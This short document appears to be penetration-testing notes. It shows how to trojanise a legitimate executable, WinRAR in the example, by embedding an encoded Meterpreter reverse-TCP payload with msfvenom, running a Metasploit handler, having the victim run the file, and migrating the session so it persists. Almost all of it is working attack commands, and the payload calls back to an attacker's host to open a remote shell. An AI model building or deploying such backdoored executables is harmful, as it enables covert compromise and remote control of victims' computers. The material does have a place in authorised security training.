- Find or create a legitimate executable. (Exemple: WinRAR)
- Now we will inject a payload into the executable.

```bash
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 10 -f exe -x /path/to/winrar.exe > /path/to/malicious/winrar.exe

msf > use mulit/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set OPTIONS 
msf > run

Execute the malicious winrar to get the meterpreter session.

msf > run post/windows/manage/migrate (To migrate the process of the meterpreter to another process and stay persistent)
```